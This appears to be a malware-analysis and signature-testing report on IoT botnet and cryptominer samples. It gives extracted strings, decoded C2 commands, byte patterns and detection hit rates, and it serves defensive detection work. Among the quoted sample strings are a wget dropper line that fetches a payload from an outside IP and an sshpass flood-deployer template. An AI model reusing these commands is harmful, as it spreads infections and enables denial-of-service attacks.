Test one-string `{ 23 21 2f 62 69 6e 2f 73 68 0a 63 64 20 2f 64 76 72 0a 72 6d 20 2d 66`: tp=10 fn=0 fp=0 (total hits 10)
Test any-of 2 anchors: tp=10 fn=0 fp=0

Rule hint: od_* family only.

## C2 address resolution (8.8.8.8, resolve_cnc_addr)

`c2_dns_resolve_google`  MITRE: T1568, T1071.004  holders: **51**

Hardcoded 8.8.8.8 resolver and resolve_cnc_addr().

Arches: {'ARM': 28, 'MIPS:32': 11, 'x86:32': 6, '68000': 2, 'sparc': 1, 'x86:64': 1, 'SuperH4': 1, 'PowerPC': 1}  
Name stems: {'MD5': 13, 'MD5.unpacked': 8, '': 8, 'DEMONS': 4, 'nuclear': 2, 'weednet': 1, 'chernobyl': 1, 'unet': 1, 'cock': 1, 'm-p.s-l.dick': 1}

Evidence:

- [string] `'8.8.8.8'` files=33 arches={'MIPS:32': 11, 'ARM': 10, 'x86:32': 6, '68000': 2} also in libc resolvers: 33 files

Function clusters (named, unstripped builds):

- cl 1073856089 `resolve_cnc_addr` members=12 files=12 coh=1.0 arch={'ARM': 12}
- cl 1073819618 `FUN_000190c8` members=2 files=2 coh=1.0 arch={'ARM': 2}
- cl 1073795579 `FUN_00015ed0` members=2 files=2 coh=1.0 arch={'ARM': 2}
- cl 1073842631 `resolve_cnc_addr` members=2 files=2 coh=1.0 arch={'ARM': 2}

Cluster holding the anchor string, per arch:

- ARM: cl 1073887793 (FUN_0001f190, 4 members, coh 0.97)
- MIPS:32: cl 1073886449 (getOurIP, 5 members, coh 0.99)
- x86:32: cl 1073888869 (FUN_000119c0, 2 members, coh 0.91)
- SuperH4: cl 1073888658 (getOurIP, 6 members, coh 0.95)
- PowerPC: cl 1073888658 (getOurIP, 6 members, coh 0.95)

Seed bytes (cluster 1073856089):

- ARM:LE:32:v8 w16 cov=1.0: `{ 00 eb 28 40 9f e5 00 10 a0 e3 04 00 84 e5 ?? 00 }`

Test one-string `"8.8.8.8"`: tp=33 fn=18 fp=18 (total hits 51)

Rule hint: resolve_cnc_addr cluster (12 ARM) is the precise anchor.

## C2 keepalive 'pong %s'

`c2_text_ping_pong`  MITRE: T1071  holders: **32**

Replies 'pong %s' to a PING command.

Arches: {'ARM': 4, 'MIPS:32': 4, 'SuperH4': 4, 'x86:64': 4, 'PowerPC': 3, 'x86:32': 3, '68000': 2, 'RISCV:32': 2, 'AARCH64': 2, 'RISCV:64': 2}  
Name stems: {'MD5.unpacked': 11, 'xnxnxnxnxnxnxnxn': 8, 'MD5': 6, 'xnxnxnxnxnxnxnxnsh2x': 2, 'xnxnxnxnxnxnxnxnloon': 2, 'boatnet': 1, 'boatnet.powerpc': 1, 'MD5MD5': 1}

Evidence:

- [string] `'pong %s'` files=32 arches={'ARM': 4, 'MIPS:32': 4, 'SuperH4': 4, 'x86:64': 4} 
- [string] `'[main] ping received from cnc\n'` files=1 arches={'x86:32': 1} 
- [string] `'[main] cnc initiating lockdown to start\n'` files=1 arches={'x86:32': 1} 

Cluster holding the anchor string, per arch:

- MIPS:32: cl 1073742303 (FUN_0040559c, 2 members, coh 1.0)
- RISCV:64: cl 1073886164 (FUN_ram_00012f94, 4 members, coh 0.99)
- ARM: cl 1073811479 (FUN_0000850c, 2 members, coh 1.0)
- Loongarch: cl 1073778486 (FUN_ram_120005b80, 2 members, coh 1.0)
- AARCH64: cl 1073781348 (FUN_004058c0, 2 members, coh 1.0)
- x86:64: cl 1073808361 (FUN_00408350, 2 members, coh 1.0)
- RISCV:32: cl 1073886164 (FUN_ram_00012f94, 4 members, coh 0.99)
- 68000: cl 1073790974 (FUN_80003866, 2 members, coh 1.0)

Seed bytes (cluster 1073886164):

- RISCV:LE:32:AndeStar_v5 w16 cov=1.0: `{ 63 07 05 12 13 01 01 d8 23 2c 81 26 23 2a 91 26 }`
- RISCV:LE:64:default w16 cov=1.0: `{ 63 07 05 12 13 01 01 d4 23 38 81 2a 23 34 91 2a }`

Test one-string `"pong %s"`: tp=32 fn=0 fp=11 (total hits 43)

Rule hint: 32 files (SH4/x64/ARM...).

## IRC / gafgyt command words (XOR-0x22 encoded)

`irc_gafgyt_commands_xor22`  MITRE: T1071, T1027  holders: **18**

XOR-0x22 strings decoding to PRIVMSG, KILLATTK, GETLOCALIP, BOGOMIPS, dvrHelper.

Arches: {'MIPS:32': 7, 'ARM': 5, 'x86:32': 2, '68000': 1, 'x86:64': 1, 'AARCH64': 1, 'SuperH4': 1}  
Name stems: {'MD5.unpacked': 12, 'MD5': 2, 'miniiupnpd': 1, 'm-p.s-l.dick': 1, 'MD5MD5.elf': 1, 'upnnpd': 1}

Evidence:

- [xor22] `'rpktoqe"'` decoded `PRIVMSG` files=16 arches={'MIPS:32': 6, 'ARM': 4, 'x86:32': 2, 'AARCH64': 1} -> 'PRIVMSG'
- [xor22] `'iknncvvi"'` decoded `KILLATTK` files=16 arches={'MIPS:32': 6, 'ARM': 4, 'x86:32': 2, 'AARCH64': 1} -> 'KILLATTK'
- [xor22] `'egvnmacnkr"'` decoded `GETLOCALIP` files=18 arches={'MIPS:32': 7, 'ARM': 5, 'x86:32': 2, 'AARCH64': 1} -> 'GETLOCALIP'
- [xor22] `'`memokrq"'` decoded `BOGOMIPS` files=16 arches={'MIPS:32': 6, 'ARM': 4, 'x86:32': 2, 'AARCH64': 1} -> 'BOGOMIPS'
- [xor22] `'FTPjGNRGP"'` decoded `dvrHelper` files=16 arches={'MIPS:32': 6, 'ARM': 4, 'x86:32': 2, 'AARCH64': 1} -> 'dvrHelper'
- [xor22] `'AJWLIGF"'` decoded `chunked` files=18 arches={'MIPS:32': 7, 'ARM': 5, 'x86:32': 2, 'AARCH64': 1} -> 'chunked'

Cluster holding the anchor string, per arch:

- ARM: cl 1073795588 (FUN_00016df8, 2 members, coh 1.0)
- AARCH64: cl 1073889437 (do_dlvsym, 2368 members, coh 1.0)

Seed bytes (cluster 1073889437):

- Loongarch:LE:64:lp64d w16 cov=1.0: `{ 63 80 ff 02 79 00 00 27 b9 8c 00 1a 39 23 c3 02 }`
- MIPS:BE:32:default w16 cov=0.75: `{ 24 82 00 10 24 86 00 0c af bc 00 20 af b0 00 28 }`

Test one-string `{ 72 70 6b 74 6f 71 65 22 }`: tp=16 fn=2 fp=1 (total hits 17)
Test any-of 5 anchors: tp=18 fn=0 fp=1

Rule hint: 16 files; encoded forms are rare in libc, safe.

## 'Self Rep' banner string

`self_rep_banner`  MITRE: T1210  holders: **32**

Verbose gafgyt/Qbot-style 'Self Rep Fucking NeTiS and Thisity ...' propagation banner.

Arches: {'ARM': 15, '68000': 4, 'x86:64': 3, 'sparc': 3, 'PowerPC': 3, 'x86:32': 3, 'MIPS:64': 1}  
Name stems: {'MD5.unpacked': 21, 'boatnet': 6, '': 4, 'MD5MD5': 1}

Evidence:

- [string] `'Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T '` files=32 arches={'ARM': 15, '68000': 4, 'x86:64': 3, 'sparc': 3} 

Cluster holding the anchor string, per arch:

- x86:32: cl 1073885226 (FUN_0804ca20, 3 members, coh 1.0)
- ARM: cl 1073888073 (attack_method_ovhdrop, 6 members, coh 0.96)
- 68000: cl 1073793388 (FUN_80004a52, 3 members, coh 1.0)
- sparc: cl 1073805457 (FUN_00015000, 3 members, coh 1.0)
- PowerPC: cl 1073883025 (FUN_1000517c, 3 members, coh 1.0)
- x86:64: cl 1073882048 (FUN_00404e50, 3 members, coh 1.0)

Seed bytes (cluster 1073888073):

- ARM:LE:32:v8 w16 cov=1.0: `{ f0 4f 2d e9 3c d0 4d e2 00 10 8d e5 04 10 a0 e3 }`

Test one-string `"Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG"`: tp=32 fn=0 fp=33 (total hits 65)

Rule hint: 32 files across ARM/m68k/x86; single-string rule is clean.

## Embedded XMRig cryptominer (Go/C++ UPX-unpacked)

`cryptominer_xmrig`  MITRE: T1496  holders: **8**

XMRig config/usage strings, stratum URLs, cryptonight algo names, donate servers.

Arches: {'x86:64': 2, 'x86:32': 2, 'AARCH64': 2, 'ARM': 2}  
Name stems: {'MD5.unpacked': 8}

Evidence:

- [string] `'no valid configuration found, try https://xmrig.com/wizard'` files=8 arches={'x86:64': 2, 'x86:32': 2, 'AARCH64': 2, 'ARM': 2} 
- [string] `'donate.v2.xmrig.com'` files=6 arches={'x86:64': 2, 'AARCH64': 2, 'ARM': 2} 
- [string] `'stratum+tcp://'` files=8 arches={'x86:64': 2, 'x86:32': 2, 'AARCH64': 2, 'ARM': 2} 
- [string] `'cryptonight-monerov8'` files=8 arches={'x86:64': 2, 'x86:32': 2, 'AARCH64': 2, 'ARM': 2} 
- [string] `'donate-over-proxy'` files=8 arches={'x86:64': 2, 'x86:32': 2, 'AARCH64': 2, 'ARM': 2} 

Cluster holding the anchor string, per arch:

- AARCH64: cl 1073886519 (FUN_004ba500, 2 members, coh 0.97)
- ARM: cl 1073887835 (FUN_000d5540, 2 members, coh 0.94)
- x86:32: cl 1073888344 (FUN_081545c0, 2 members, coh 0.93)

Seed bytes (cluster 1073886519):


Test one-string `"no valid configuration found, try https://xmrig."`: tp=8 fn=0 fp=0 (total hits 8)
Test any-of 3 anchors: tp=8 fn=0 fp=1

Rule hint: 8 files, ARM/AARCH64/x86.

## SSH deployer of a python UDP flood script

`ssh_python_udp_deployer`  MITRE: T1021.004, T1498  holders: **11**

sshpass -p ... ssh ... 'python udp.py' with ssh_server_ip config.

Arches: {'ARM': 3, 'MIPS:32': 2, 'x86:32': 2, '68000': 1, 'x86:64': 1, 'SuperH4': 1, 'PowerPC': 1}  
Name stems: {'cock': 1, 'weednet': 1, 'net': 1, 'dicknet': 1, 'fucknet': 1, 'gaynet': 1, 'swatnet': 1, 'botnet': 1, 'ballnet': 1, 'unet': 1}

Evidence:

- [string] `"sshpass -p '%s' ssh -o StrictHostKeyChecking=no %s@%s '%scd; python ud"` files=11 arches={'ARM': 3, 'x86:32': 2, 'MIPS:32': 2, '68000': 1} 
- [string] `'ssh_server_ip'` files=11 arches={'ARM': 3, 'x86:32': 2, 'MIPS:32': 2, '68000': 1} 

Cluster holding the anchor string, per arch:

- MIPS:32: cl 1073888522 (senditbudAMP, 7 members, coh 0.98)
- ARM: cl 1073888522 (senditbudAMP, 7 members, coh 0.98)
- PowerPC: cl 1073888522 (senditbudAMP, 7 members, coh 0.98)
- x86:32: cl 1073812669 (senditbudAMP, 2 members, coh 1.0)
- 68000: cl 1073888522 (senditbudAMP, 7 members, coh 0.98)

Seed bytes (cluster 1073888522):

- ARM:LE:32:v8 w16 cov=0.667: `{ 0d c0 a0 e1 00 dc 2d e9 04 b0 4c e2 4e df 4d e2 }`

Test one-string `"sshpass -p '%s' ssh -o StrictHostKeyChecking=no "`: tp=11 fn=0 fp=0 (total hits 11)
Test any-of 2 anchors: tp=11 fn=0 fp=0

Rule hint: 11 'net'-named gafgyt files.

## Condi botnet file markers

`condi_botnet_markers`  MITRE: T1036  holders: **11**

/var/condibot, /var/CondiBot, /var/condinet, /tmp/condinetwork.

Arches: {'ARM': 4, 'x86:32': 2, '68000': 1, 'PowerPC': 1, 'x86:64': 1, 'AARCH64': 1, 'SuperH4': 1}  
Name stems: {'MD5.unpacked': 9, 'MD5': 2}

Evidence:

- [string] `'/var/condibot'` files=11 arches={'ARM': 4, 'x86:32': 2, 'AARCH64': 1, 'SuperH4': 1} 
- [string] `'/var/CondiBot'` files=11 arches={'ARM': 4, 'x86:32': 2, 'AARCH64': 1, 'SuperH4': 1} 
- [string] `'/var/condinet'` files=11 arches={'ARM': 4, 'x86:32': 2, 'AARCH64': 1, 'SuperH4': 1} 
- [string] `'/tmp/condinetwork'` files=11 arches={'ARM': 4, 'x86:32': 2, 'AARCH64': 1, 'SuperH4': 1} 

Function clusters (named, unstripped builds):

- cl 1073887408 `killer_condi` members=2 files=2 coh=0.95 arch={'SuperH4': 1, 'ARM': 1}

Cluster holding the anchor string, per arch:

- SuperH4: cl 1073887408 (killer_condi, 2 members, coh 0.95)
- ARM: cl 1073878036 (FUN_000166b0, 3 members, coh 1.0)
- x86:32: cl 1073888220 (FUN_0040d080, 3 members, coh 0.93)
- x86:64: cl 1073888220 (FUN_0040d080, 3 members, coh 0.93)

Seed bytes (cluster 1073878036):

- ARM:LE:32:v8 w16 cov=1.0: `{ eb 01 00 70 e3 00 30 a0 13 01 30 a0 03 00 00 50 }`

Test one-string `"/var/condibot"`: tp=11 fn=0 fp=2 (total hits 13)
Test any-of 3 anchors: tp=11 fn=0 fp=2

Rule hint: 11 files.

## Android ADB spreading

`adb_android_spread`  MITRE: T1021, T1105  holders: **11**

adb scanner/payload ('[adb] payload fired'), /data/local/tmp dropper lines.

Arches: {'ARM': 5, 'MIPS:32': 4, 'AARCH64': 2}  
Name stems: {'MD5MD5': 9, '': 1, 'MD5MD5.elf': 1}

Evidence:

- [string] `'[adb] payload fired at %s\n'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} 
- [string] `'%s|adb|shell|shell'` files=10 arches={'MIPS:32': 4, 'ARM': 4, 'AARCH64': 2} 
- [string] `'sh -c "cd /data/local/tmp; wget http://37.48.254.120/arm7 -O arm7; chm'` files=1 arches={'ARM': 1} 
- [xor22] `'FCVC\rNMACN"'` decoded `data/local` files=47 arches={'ARM': 16, 'MIPS:32': 10, 'x86:32': 8, 'x86:64': 4} xor22 'data/local'

Cluster holding the anchor string, per arch:

- MIPS:32: cl 1073886103 (adb_infect, 8 members, coh 0.99)
- ARM: cl 1073886103 (adb_infect, 8 members, coh 0.99)
- AARCH64: cl 1073837881 (adb_infect, 2 members, coh 1.0)

Seed bytes (cluster 1073886103):

- ARM:LE:32:v8 w16 cov=1.0: `{ f0 41 2d e9 55 de 4d e2 08 d0 4d e2 00 70 a0 e1 }`
- MIPS:BE:32:default w16 cov=1.0: `{ 3c 1c 00 10 27 9c 4a e0 03 99 e0 21 27 bd fa 78 }`

Test one-string `{ 5b 61 64 62 5d 20 70 61 79 6c 6f 61 64 20 66 69 72 65 64 20 61 74 20`: tp=10 fn=1 fp=0 (total hits 10)
Test any-of 3 anchors: tp=11 fn=0 fp=0

Rule hint: 3-4 distinct families; 'data/local' XOR string is in 47 files.

## Go-language bot with scanner + loader + socks5

`go_bot_scanner_loader`  MITRE: T1595, T1498, T1090  holders: **1**

Go-built bot: 'Scanner started. Payload (Loader)', tcp-stomp, minecraft, xmrig-x86 in the Go string pool.

Arches: {'MIPS:64': 1}  
Name stems: {'': 1}

Evidence:

- [string] `'struct contains unexported fieldsAuto-reconnecting (120s limit)...\nSca'` files=1 arches={'MIPS:64': 1} Go pooled string

Cluster holding the anchor string, per arch:


Test one-string `"Auto-reconnecting (120s limit)"`: tp=1 fn=0 fp=2 (total hits 3)

Rule hint: Go binaries have packed string pools; use `wide ascii` substrings of the pool.

## Cross-variant marker strings (Mirai/gafgyt helpers)

`family_marker_strings`  MITRE: -  holders: **96**

Strings that act as family anchors rather than a capability: rand_alphastr alphabet, 'im in deep sorrow.', md5-looking token, base62 token.

Arches: {'ARM': 27, 'MIPS:32': 18, 'x86:32': 14, 'SuperH4': 8, '68000': 7, 'x86:64': 6, 'PowerPC': 5, 'AARCH64': 2, 'RISCV:64': 2, 'RISCV:32': 2}  
Name stems: {'p': 31, 'MD5.unpacked': 24, '': 12, 'xnxnxnxnxnxnxnxn': 8, 'MD5': 2, 'xnxnxnxnxnxnxnxnsh2x': 2, 'xnxnxnxnxnxnxnxnloon': 2, 'weednet': 1, 'unet': 1, 'gaynet': 1}

Evidence:

- [string] `'abcdefghijklmnopqrstuvw012345678'` files=52 arches={'ARM': 17, 'MIPS:32': 13, 'x86:32': 7, '68000': 4} Mirai rand_alphastr
- [string] `'im in deep sorrow.'` files=38 arches={'ARM': 15, 'x86:32': 9, '68000': 4, 'PowerPC': 3} 
- [string] `'fd00e82a0a3d86af73deacaa9df16432'` files=20 arches={'SuperH4': 4, 'MIPS:32': 2, '68000': 2, 'RISCV:32': 2} 
- [string] `'lXfYC7TFaCq5Hv982wuIiKcHlgFA0jEsW2OFQStO7x6zN9dBgayyWgvbk0L3lZClzJCmFG'` files=18 arches={'ARM': 6, 'x86:32': 3, 'MIPS:32': 3, 'PowerPC': 2} 

Function clusters (named, unstripped builds):

- cl 1073856095 `rand_str` members=26 files=26 coh=1.0 arch={'ARM': 26}
- cl 1073887907 `FUN_004085a8` members=16 files=16 coh=0.99 arch={'MIPS:32': 12, 'SuperH4': 2, '68000': 2}
- cl 1073844842 `rand_alphastr` members=6 files=6 coh=1.0 arch={'ARM': 6}
- cl 1073797449 `FUN_0000ebc8` members=4 files=4 coh=1.0 arch={'ARM': 2, 'MIPS:32': 1, 'x86:64': 1}
- cl 1073762896 `FUN_00014744` members=2 files=2 coh=1.0 arch={'ARM': 2}

Cluster holding the anchor string, per arch:

- ARM: cl 1073844842 (rand_alphastr, 6 members, coh 1.0)
- 68000: cl 1073755056 (FUN_80006076, 2 members, coh 1.0)
- MIPS:32: cl 1073881008 (FUN_00408aa8, 7 members, coh 1.0)
- PowerPC: cl 1073789867 (FUN_100064ac, 2 members, coh 1.0)
- x86:32: cl 1073846429 (FUN_0804d3b0, 5 members, coh 1.0)
- SuperH4: cl 1073842080 (FUN_004058a0, 2 members, coh 1.0)
- x86:64: cl 1073803509 (FUN_00405ff0, 2 members, coh 1.0)

Seed bytes (cluster 1073856095):

- ARM:LE:32:v8 w16 cov=1.0: `{ 00 00 51 e3 f0 45 2d e9 00 50 a0 e1 27 00 00 da }`

Test one-string `"abcdefghijklmnopqrstuvw012345678"`: tp=54 fn=42 fp=1 (total hits 55)
Test any-of 4 anchors: tp=96 fn=0 fp=9

Rule hint: Use as family labels, not capability detection.

## Not found or weak

- **socks_proxy**: only Go stdlib 'socks5' strings in Go builds; no bot SOCKS server code found
- **reverse_shell**: no bash -i / /dev/tcp strings; TCP_MSGHEAD_CMD is a command carrier, not a reverse shell
- **data_wipe**: 'dd if=' appears in 6 ksync-family files only; no confirmed wipe routine
- **cpu_resource_check**: /proc/cpuinfo (56), /sys/devices/system/cpu are libc/nproc noise; only the xor22 'BOGOMIPS' string is bot-specific (see irc_gafgyt_commands_xor22)
- **dns_water_torture**: code-only: attack_udp_dns cluster 1073886487 (10 ARM files); no strings
- **ddos_stomp_http_priv7**: PRIV7 (1 x64 file), '[INFO] STOMP not implemented' (1 file): single-sample
